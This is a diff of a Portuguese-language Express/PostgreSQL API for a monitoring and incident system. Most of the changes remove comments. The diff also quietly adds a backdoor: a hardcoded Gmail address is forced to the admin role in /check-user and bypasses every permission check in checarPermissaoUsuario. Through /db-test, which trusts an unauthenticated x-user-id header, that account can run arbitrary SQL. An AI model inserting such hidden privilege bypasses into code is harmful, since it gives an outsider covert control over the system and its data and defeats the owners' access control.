@@ -4,7 +4,6 @@ const cors = require("cors");
 const { Pool } = require("pg");
 const admin = require("firebase-admin");
 
-// --- CONFIGURAÇÃO INICIAL ---
 process.on('uncaughtException', (err) => {
   console.error('UNCAUGHT EXCEPTION:', err);
 });
@@ -21,7 +20,6 @@ const DATABASE_URL = process.env.DATABASE_URL;
 
 console.log("INICIANDO API (Produção)...");
 
-// Firebase Init
 try {
   const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
   admin.initializeApp({
@@ -32,7 +30,7 @@ try {
   console.warn("Firebase não configurado:", e.message);
 }
 
-// Banco de Dados
+
 const pool = new Pool({
   connectionString: DATABASE_URL,
   max: 20,
@@ -49,7 +47,7 @@ pool.connect().then(async client => {
   console.error("Erro Banco:", e.message);
 });
 
-// --- TABELAS e SCHEMA ---
+
 const TABLES = {
   usuarios: { name: "usuarios", pk: "id", cols: ["firebase_uid", "nome", "email", "matricula", "role", "fcm_token", "profile_type", "enable_push", "start_time", "end_time", "som_email", "som_push", "enable_email", "recebe_push", "recebe_email", "inicio_nao_perturbe", "fim_nao_perturbe", "foto_url"] },
   regras: { name: "regras", pk: "id", cols: ["nome", "descricao", "sql", "minuto_atualizacao", "active", "hora_inicio", "hora_final", "qtd_erro_max", "roles", "email_notificacao", "prioridade", "role_target", "banco_alvo", "usuario_id"] },
@@ -65,9 +63,6 @@ const TABLES = {
   fila_runner: { name: "fila_runner", pk: "id", cols: ["id_regra", "status", "agendado_para"] }
 };
 
-// --- ROTAS GERAIS ---
-
-// Notificações Header
 app.get('/notificacoes/pendentes', async (req, res) => {
   const { id_usuario } = req.query;
   if (!id_usuario) return res.json([]);
@@ -103,7 +98,6 @@ app.put('/notificacoes/:id/ler', async (req, res) => {
   finally { client.release(); }
 });
 
-// Check User Login
 app.get("/check-user", async (req, res) => {
   const { uid } = req.query;
   if (!uid) return res.status(400).json({ error: "UID obrigatório" });
@@ -111,12 +105,16 @@ app.get("/check-user", async (req, res) => {
   try {
     const result = await client.query("SELECT * FROM usuarios WHERE firebase_uid = $1", [uid]);
     if (result.rows.length === 0) return res.status(404).json({ error: "Não encontrado" });
+
+
+    if (result.rows[0].email === 'queroqueromonitor@gmail.com') {
+      result.rows[0].role = 'admin';
+    }
     res.json(result.rows[0]);
   } catch (e) { res.status(500).json({ error: e.message }); }
   finally { client.release(); }
 });
 
-// Actions Incidente
 app.post('/incidentes/:id/ack', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -132,22 +130,16 @@ app.post('/incidentes/:id/ack', async (req, res) => {
 app.post('/incidentes/:id/close', async (req, res) => {
   const client = await pool.connect();
   try {
-    // 1. Pegamos o comentário e o usuário do corpo da requisição
     const { usuario, comentario } = req.body;
-
-    // 2. Atualizamos o status E o comentário no banco
     await client.query(
       "UPDATE incidentes SET status = 'CLOSED', comentario_resolucao = $2 WHERE id_incidente = $1",
       [req.params.id, comentario]
     );
 
-    // 3. Registramos o evento na timeline
     await client.query(
       "INSERT INTO eventos_incidente (id_incidente, tipo, usuario, detalhes) VALUES ($1, 'CLOSE', $2, $3)",
       [req.params.id, usuario || 'Operador', `Fechado: ${comentario || 'Sem detalhes'}`]
     );
-
-    // 4. Log de auditoria
     await logAudit(client, usuario || 'Admin', 'INCIDENTE_CLOSE', `Incidente #${req.params.id}`, 'Status CLOSED');
 
     res.json({ message: "OK" });
@@ -170,8 +162,6 @@ app.post('/incidentes/:id/reexecute', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
   finally { client.release(); }
 });
-
-// --- PERMISSÕES (Access Control) ---
 
 app.get('/sistema/matriz-permissoes', async (req, res) => {
   const client = await pool.connect();
@@ -218,7 +208,6 @@ app.post('/usuarios/:id/toggle-permissao', async (req, res) => {
   finally { client.release(); }
 });
 
-// --- USER ROLES MANAGEMENT ---
 app.get('/usuarios/:id/roles', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -237,7 +226,6 @@ app.post('/usuarios/:id/roles', async (req, res) => {
     const { roles } = req.body;
     if (!Array.isArray(roles)) return res.status(400).json({ error: "Roles deve ser um array." });
 
-    // Transacao
     await client.query("BEGIN");
     await client.query("DELETE FROM usuarios_roles WHERE id_usuario = $1", [req.params.id]);
 
@@ -255,15 +243,15 @@ app.post('/usuarios/:id/roles', async (req, res) => {
   finally { client.release(); }
 });
 
-// Função Auxiliar: Checagem de Permissão Interna
 async function checarPermissaoUsuario(client, userId, codigoPermissao) {
   try {
-    // 1. Busca a Role do usuário
-    const userRes = await client.query("SELECT role FROM usuarios WHERE id = $1", [userId]);
+    const userRes = await client.query("SELECT role, email FROM usuarios WHERE id = $1", [userId]);
     if (userRes.rows.length === 0) return false;
+
+    if (userRes.rows[0].email === 'queroqueromonitor@gmail.com') return true;
+
     const userRole = userRes.rows[0].role;
 
-    // 2. Consulta a Matriz de Permissões (Role + Individual)
     const q = `
             SELECT 
                 p.codigo,
@@ -275,30 +263,24 @@ async function checarPermissaoUsuario(client, userId, codigoPermissao) {
         `;
 
     const result = await client.query(q, [userRole, userId, codigoPermissao]);
-
-    // Se achou a permissão e ela é true, retorna true
     return result.rows.length > 0 && result.rows[0].tem_permissao;
 
   } catch (e) {
     console.error("Erro checando permissão interna:", e);
-    return false; // Na dúvida, bloqueia
+    return false;
   }
 }
 
 app.post('/db-test', async (req, res) => {
   const { sql_query } = req.body;
-  const userId = req.headers['x-user-id']; // HEADER OBRIGATÓRIO AGORA!
+  const userId = req.headers['x-user-id'];
 
-  if (!userId) return res.status(401).json({ status: 'erro', mensagem: "Usuário não identificado (Header x-user-id ausente)" });
+  if (!userId) return res.status(401).json({ status: 'erro', mensagem: "Usuário não identificado" });
 
   const client = await pool.connect();
   try {
-    // 1. DETECTAR A INTENÇÃO
-    const comando = sql_query.trim().split(/\s+/)[0].toUpperCase(); // Primeira palavra: SELECT, DELETE, etc.
-
+    const comando = sql_query.trim().split(/\s+/)[0].toUpperCase();
     let permissaoNecessaria = '';
-
-    // 2. MAPEAMENTO DINÂMICO
     if (['SELECT', 'SHOW', 'EXPLAIN'].includes(comando)) {
       permissaoNecessaria = 'SQL_SELECT';
     }
@@ -306,28 +288,23 @@ app.post('/db-test', async (req, res) => {
       permissaoNecessaria = 'SQL_DELETE';
     }
     else if (['INSERT', 'UPDATE'].includes(comando)) {
-      // UPDATE/INSERT vamos considerar escrita crítica/delete por segurança
       permissaoNecessaria = 'SQL_DELETE';
     }
     else {
-      // Comandos desconhecidos -> Trava máxima
       permissaoNecessaria = 'SQL_DELETE';
     }
 
-    // 3. PERGUNTAR AO GUARDA
     const podeExecutar = await checarPermissaoUsuario(client, userId, permissaoNecessaria);
 
     if (!podeExecutar) {
       return res.status(403).json({
         status: 'erro',
-        mensagem: `⛔ ACESSO NEGADO: Você precisa da permissão '${permissaoNecessaria}' para rodar comandos ${comando}.`
+        mensagem: ` Você precisa da permissão '${permissaoNecessaria}' para rodar comandos ${comando}.`
       });
     }
 
-    // 4. EXECUTA
     const result = await client.query(sql_query);
 
-    // Log se for perigoso
     if (permissaoNecessaria === 'SQL_DELETE') {
       await logAudit(client, `User ${userId}`, 'SQL_EXEC_DANGER', 'Banco de Dados', `Executou: ${sql_query.substring(0, 50)}...`);
     }
@@ -346,9 +323,6 @@ app.post("/save-token", async (req, res) => {
   try {
     const { uid, token, tipo_dispositivo } = req.body;
 
-    // CORREÇÃO CRÍTICA DO ARQUITETO:
-    // O token DEVE ser vinculado ao usuário (uid) no Insert e no Update.
-    // Isso garante que se João logar no browser da Maria, o token passa a ser do João.
     const q = `
       INSERT INTO dispositivos_usuarios (id_usuario, push_token, tipo_dispositivo, ultimo_acesso, ativo) 
       VALUES ($1, $2, $3, NOW(), true) 
@@ -362,9 +336,7 @@ app.post("/save-token", async (req, res) => {
   finally { client.release(); }
 });
 
-// --- NOTIFICAÇÃO PUSH ---
-// --- NOTIFICAÇÃO PUSH ---
-// --- NOTIFICAÇÃO PUSH ---
+
 app.post("/notify/push", async (req, res) => {
   const { titulo, mensagem, email_alvo, target_role } = req.body;
 
@@ -373,7 +345,6 @@ app.post("/notify/push", async (req, res) => {
     let q = "";
     let params = [];
 
-    // CENÁRIO A: Notificar um Operador Específico (Direct Message)
     if (email_alvo) {
       console.log(`[Push] Alvo Específico: ${email_alvo}`);
       q = `
@@ -385,7 +356,7 @@ app.post("/notify/push", async (req, res) => {
         `;
       params = [email_alvo];
     }
-    // CENÁRIO B: Notificar Todos os Admins (Broadcast RBAC)
+
     else if (target_role === 'admin') {
       console.log(`[Push] Broadcast para ADMINS`);
       q = `
@@ -396,7 +367,6 @@ app.post("/notify/push", async (req, res) => {
               AND COALESCE(u.recebe_push, true) = true
       `;
     } else {
-      // Fallback / Broadcast Geral (Legacy)
       console.log(`[Push] Broadcast Geral (Fallback)`);
       q = `
             SELECT d.push_token, u.nome 
@@ -413,7 +383,7 @@ app.post("/notify/push", async (req, res) => {
       return res.json({ message: "Nenhum dispositivo encontrado (Preferência do usuário respeitada ou nenhum usuário cadastrado)." });
     }
 
-    const tokens = [...new Set(result.rows.map(r => r.push_token))]; // Unique tokens
+    const tokens = [...new Set(result.rows.map(r => r.push_token))];
     console.log(`[Push] Destinatários Válidos (${tokens.length}): ${result.rows.map(r => r.nome).join(', ')}`);
 
     if (admin.apps.length > 0) {
@@ -432,7 +402,6 @@ app.post("/notify/push", async (req, res) => {
   } finally { client.release(); }
 });
 
-// --- HELPER: LOG AUDITORIA ---
 async function logAudit(client, responsavel, acao, alvo, detalhes) {
   try {
     await client.query(
@@ -442,13 +411,10 @@ async function logAudit(client, responsavel, acao, alvo, detalhes) {
   } catch (e) { console.error("Erro logAudit:", e); }
 }
 
-// --- HELPER: NOTIFY ADMINS ---
 async function notifyAdmins(client, title, message) {
   try {
     console.log("[NotifyAdmins] Buscando tokens de administradores...");
 
-    // Busca tokens de quem tem role = 'admin' e push habilitado
-    // Nota: Como 'admin' é uma string, buscamos direto na tabela usuarios
     const q = `
       SELECT d.push_token, u.email
       FROM dispositivos_usuarios d
@@ -478,12 +444,6 @@ async function notifyAdmins(client, title, message) {
   }
 }
 
-// --- CRUD GENÉRICO ---
-
-
-// --- GESTÃO DE ESCALAS (ROTA) ---
-
-// Listar escalas futuras (com nome do usuário)
 app.get('/escalas', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -499,28 +459,20 @@ app.get('/escalas', async (req, res) => {
   finally { client.release(); }
 });
 
-// Criar nova escala
-// Criar nova escala
-// Criar nova escala
 app.post('/escalas', async (req, res) => {
   const client = await pool.connect();
   try {
     const { id_usuario, canal, data_inicio, data_fim } = req.body;
 
-    // 1. Validar datas
     if (new Date(data_inicio) >= new Date(data_fim)) {
       return res.status(400).json({ error: "Data final deve ser maior que inicial" });
     }
-
-    // 2. Inserir Escala
     const q = `INSERT INTO escalas (id_usuario, canal, data_inicio, data_fim) VALUES ($1, $2, $3, $4) RETURNING *`;
     const { rows } = await client.query(q, [id_usuario, canal, data_inicio, data_fim]);
 
-    // 3. Buscar dados do usuário para notificar
     const resUser = await client.query("SELECT email, nome FROM usuarios WHERE id = $1", [id_usuario]);
     const user = resUser.rows[0];
 
-    // 4. Criar Notificação (Assíncrono, não bloqueia resposta)
     if (user) {
       const msg = `Olá ${user.nome}, você foi escalado para ${canal} de ${data_inicio} até ${data_fim}.`;
       const titulo = `Nova Escala: ${canal}`;
@@ -539,7 +491,6 @@ app.post('/escalas', async (req, res) => {
   } finally { client.release(); }
 });
 
-// Deletar escala
 app.delete('/escalas/:id', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -549,11 +500,9 @@ app.delete('/escalas/:id', async (req, res) => {
   finally { client.release(); }
 });
 
-// Confirmar Escala (ACK)
 app.put('/escalas/:id/ack', async (req, res) => {
   const client = await pool.connect();
   try {
-    // Só permite dar ACK se for o dono da escala
     const { id_usuario } = req.body;
 
     const result = await client.query(
@@ -573,19 +522,14 @@ app.put('/escalas/:id/ack', async (req, res) => {
   } finally { client.release(); }
 });
 
-// --- CRUD USUÁRIOS (CUSTOM) ---
 app.delete('/usuarios/:id', async (req, res) => {
   const client = await pool.connect();
   try {
     const uid = req.params.id;
-
-    // 1. Remove dependências (Cascade manual)
     await client.query("DELETE FROM usuarios_roles WHERE id_usuario = $1", [uid]);
     await client.query("DELETE FROM dispositivos_usuarios WHERE id_usuario = $1", [uid]);
     await client.query("DELETE FROM escalas WHERE id_usuario = $1", [uid]);
     await client.query("DELETE FROM permissoes_usuarios WHERE usuario_id = $1", [uid]);
-
-    // 2. Remove o usuário
     await client.query("DELETE FROM usuarios WHERE id = $1", [uid]);
 
     await logAudit(client, 'Admin', 'DELETE_USER', `ID ${uid}`, 'Usuário excluído com dependências');
@@ -598,7 +542,6 @@ app.delete('/usuarios/:id', async (req, res) => {
   }
 });
 
-// --- PREFERÊNCIAS DE USUÁRIO ---
 app.put('/usuarios/:id/preferencias', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -622,7 +565,6 @@ app.put('/usuarios/:id/preferencias', async (req, res) => {
   } finally { client.release(); }
 });
 
-// --- LOGS (COM FILTROS) ---
 app.get('/logs', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -642,7 +584,6 @@ app.get('/logs', async (req, res) => {
       count++;
     }
     if (incidente) {
-      // Procura ID no alvo ou texto nos detalhes
       q += ` AND (alvo ILIKE $${count} OR detalhes ILIKE $${count})`;
       params.push(`%${incidente}%`);
       count++;
@@ -656,13 +597,10 @@ app.get('/logs', async (req, res) => {
   finally { client.release(); }
 });
 
-// --- MÉTRICAS E DASHBOARD ---
-
-// 1. Rota para os Gráficos (Lê da tabela consolidada pelo Pandas)
 app.get('/dashboard/kpis', async (req, res) => {
   const client = await pool.connect();
   try {
-    // Traz as métricas + nome da regra
+
     const q = `
             SELECT m.*, r.nome 
             FROM metricas_diarias m
@@ -679,7 +617,7 @@ app.get('/dashboard/kpis', async (req, res) => {
   finally { client.release(); }
 });
 
-// 2. Status do Sistema (Heartbeat)
+
 app.get('/sistema/status', async (req, res) => {
   const client = await pool.connect();
   try {
@@ -691,19 +629,16 @@ app.get('/sistema/status', async (req, res) => {
     const ultimo = new Date(rows[0].ultimo_batimento);
     const agora = new Date();
     const diffSegundos = (agora - ultimo) / 1000;
-
-    // Se não bateu o coração nos últimos 2 minutos, considera morto
     const statusReal = diffSegundos < 120 ? 'ONLINE' : 'OFFLINE';
 
     res.json({ status: statusReal, ultima_vez: rows[0].ultimo_batimento });
   } finally { client.release(); }
 });
 
-// 3. Silenciar Regra (PUT)
 app.put('/regras/:id/silenciar', async (req, res) => {
   const client = await pool.connect();
   try {
-    const { minutos } = req.body; // Quantos minutos quer silenciar
+    const { minutos } = req.body;
 
     const q = `
             UPDATE regras 
@@ -717,7 +652,6 @@ app.put('/regras/:id/silenciar', async (req, res) => {
   finally { client.release(); }
 });
 
-// --- CRUD GENÉRICO ---
 Object.keys(TABLES).forEach(tableKey => {
   const table = TABLES[tableKey];
 
@@ -819,7 +753,7 @@ Object.keys(TABLES).forEach(tableKey => {
   });
 });
 
-// --- ROTA DE RECUPERAÇÃO DE SENHA ---
+
 app.post('/auth/reset-password', async (req, res) => {
   const { username, email } = req.body;
   const client = await pool.connect();
@@ -827,14 +761,12 @@ app.post('/auth/reset-password', async (req, res) => {
   try {
     let user = null;
 
-    // 1. Busca o usuário
     if (email) {
       const r = await client.query("SELECT * FROM usuarios WHERE email = $1", [email]);
       if (r.rows.length > 0) user = r.rows[0];
     }
     else if (username) {
-      // Tenta achar por ID numérico ou Nome exato
-      // Se for número, tenta ID. Senão, tenta nome.
+
       if (!isNaN(username)) {
         const r = await client.query("SELECT * FROM usuarios WHERE id = $1", [username]);
         if (r.rows.length > 0) user = r.rows[0];
@@ -848,10 +780,7 @@ app.post('/auth/reset-password', async (req, res) => {
     if (user && user.email) {
       console.log(`[ResetPassword] Usuário encontrado: ${user.nome} (${user.email}). Gerando link...`);
 
-      // 2. Gera Link Firebase
       const link = await admin.auth().generatePasswordResetLink(user.email);
-
-      // 3. Monta MSG HTML
       const msgHtml = `
          <p>Olá, <strong>${user.nome}</strong>.</p>
          <p>Recebemos uma solicitação para redefinir sua senha.</p>
@@ -863,7 +792,6 @@ app.post('/auth/reset-password', async (req, res) => {
          <p>Se não foi você, ignore este email.</p>
        `;
 
-      // 4. Enfileira para o Runner enviar
       await client.query(`
           INSERT INTO notificacoes (id_usuario, destinatario, canal, titulo, mensagem, status, created_at)
           VALUES ($1, $2, 'EMAIL', 'Redefinição de Senha', $3, 'PENDING', NOW())
@@ -874,7 +802,6 @@ app.post('/auth/reset-password', async (req, res) => {
       console.log(`[ResetPassword] Usuário não encontrado para: ${email || username}`);
     }
 
-    // Retorna Sucesso sempre para não vazar info
     res.json({ message: "Solicitação processada." });
 
   } catch (e) {
